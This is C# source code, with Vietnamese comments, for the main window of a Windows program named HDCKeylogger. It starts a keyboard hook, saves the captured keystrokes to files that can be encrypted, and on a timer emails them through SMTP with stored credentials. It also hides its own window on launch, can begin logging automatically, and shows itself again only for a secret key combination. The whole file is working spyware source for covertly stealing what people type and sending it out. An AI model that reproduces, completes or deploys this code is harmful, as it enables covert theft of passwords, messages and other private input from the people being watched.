using HDCKeylogger.Keylog;
using HDCKeylogger.Logging;
using HDCKeylogger.Text;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml;

namespace HDCKeylogger
{
    public partial class frmMain : Form
    {
        private KeyLogger _keylogger;

        public frmMain()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Khởi tạo tham số từ setting
        /// </summary>
        private void InitSetting()
        {
            fileLogTimer.Interval = Properties.Settings.Default.LogFileTimer * 60 * 1000;
            emailTimer.Interval = Properties.Settings.Default.EmailTimer * 60 * 1000;
        }

        /// <summary>
        /// Ghi log
        /// </summary>
        /// <param name="log"></param>
        private void Log(string log)
        {
            rtbLog.AppendText("[" + DateTime.Now.ToString() + "]: " + log + Environment.NewLine);
        }

        #region Sự kiện nhấn các nút và menu
        /// <summary>
        /// Nhấn nút thoát (menu)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Xác nhận thoát", "Bạn thật sự muốn thoát?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
                Application.Exit();
        }

        /// <summary>
        /// Nhấn nút bắt đầu
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnStart_Click(object sender, EventArgs e)
        {
            _keylogger.Enable();
            fileLogTimer.Enabled = true;
            emailTimer.Enabled = true;

            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnHide.Enabled = true;
            Log("Keylogger đã hoạt động.");
        }

        /// <summary>
        /// Nhấn nút kết thúc
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnStop_Click(object sender, EventArgs e)
        {
            _keylogger.Disable();
            fileLogTimer.Enabled = false;
            emailTimer.Enabled = false;

            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnHide.Enabled = false;
            Log("Keylogger đã ngừng hoạt động.");
        }

        /// <summary>
        /// Mở form tùy chọn
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (new frmOptions().ShowDialog() == System.Windows.Forms.DialogResult.OK)
                InitSetting();
        }

        /// <summary>
        /// Mở form thông tin
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new frmAboutBox().ShowDialog();
        }

        /// <summary>
        /// Hiện trình đọc file log
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readLogFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new frmReader().Show();
        }

        /// <summary>
        /// Nhấn nút ẩn
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnHide_Click(object sender, EventArgs e)
        {
            Hide();
        }
        #endregion

        #region Các timer
        /// <summary>
        /// Form load
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void frmMain_Load(object sender, EventArgs e)
        {
            _keylogger = new KeyLogger();
            // Hiện form khi nhấn phím Ctr + Alt + Shift + H
            _keylogger.Hooker.KeyDown += ShowFormKeyDown;
            InitSetting();
            Log("Khởi động thành công!");
        }

        /// <summary>
        /// Timer ghi log file
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileLogTimer_Tick(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.AutoSaveLogFile)
            {
                string filePath = Properties.Settings.Default.LogFilePath + "\\" + DateTime.Now.ToString("dd-MM-yyyy-hh-mm-ss") + ".hdc";
                FileLogger.SaveLogfile(filePath, _keylogger.LogData);
                if (Properties.Settings.Default.EncryptFile)
                {
                    string sSecretKey;

                    // Tạo khóa
                    sSecretKey = DES.GenerateKey();
                    GCHandle gch = GCHandle.Alloc(sSecretKey, GCHandleType.Pinned);

                    // Mã hóa file
                    DES.EncryptFile(filePath,
                                    filePath + "_encrypted",
                                    sSecretKey);

                    // Xóa bỏ file chưa mã hóa
                    File.Delete(filePath);
                    File.Move(filePath + "_encrypted", filePath);

                    // Lưu key vào file xml
                    string xmlKeysFile = Properties.Settings.Default.LogFilePath + "\\keys.xml";
                    if (!File.Exists(xmlKeysFile))
                        File.Copy(".\\keys.xml", xmlKeysFile);

                    XmlDocument xml = new XmlDocument();
                    xml.Load(Properties.Settings.Default.LogFilePath + "\\keys.xml");
                    XmlElement elm = xml.CreateElement("key");
                    elm.InnerText = sSecretKey;
                    XmlAttribute attr = xml.CreateAttribute("file");
                    attr.Value = Path.GetFileName(filePath);
                    elm.Attributes.Append(attr);
                    xml.DocumentElement.AppendChild(elm);
                    xml.Save(xmlKeysFile);

                    Log("Đã mã hóa file log.");
                }
                Log("Đã lưu log vào file " + Properties.Settings.Default.LogFilePath);
            }
        }

        /// <summary>
        /// Timer gửi mail
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void emailTimer_Tick(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.AutoSendEmail)
            {
                EmailLogger.SendMail(Properties.Settings.Default.EmailAddress,
                                    Properties.Settings.Default.SMTPServer,
                                    Properties.Settings.Default.SMTPPort,
                                    Properties.Settings.Default.EmailPassword,
                                    _keylogger.Generatelog(),
                                    Properties.Settings.Default.UseSSL);
                Log("Đã gửi email đi.");
            }
        }
        #endregion


        /// <summary>
        /// Khi tổ hợp hiện form được nhấn
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ShowFormKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.H && _keylogger._isShiftDown && _keylogger._isAltDown && _keylogger._isControlDown)
                Show();
        }

        /// <summary>
        /// Khi form đang đóng
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                if (MessageBox.Show("Xác nhận thoát", "Bạn thật sự muốn thoát?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
                    Application.Exit();
                else
                    e.Cancel = true;
            }
        }

        /// <summary>
        /// Tự động ẩn
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void frmMain_Shown(object sender, EventArgs e)
        {
            Hide();
            // Tự động chạy
            if (Properties.Settings.Default.AutoStart)
                btnStart_Click(this, null);
            //  Tự động ẩn
            if (Properties.Settings.Default.AutoHide)
                btnHide_Click(this, null);
            else
                Show();
        }
    }
}
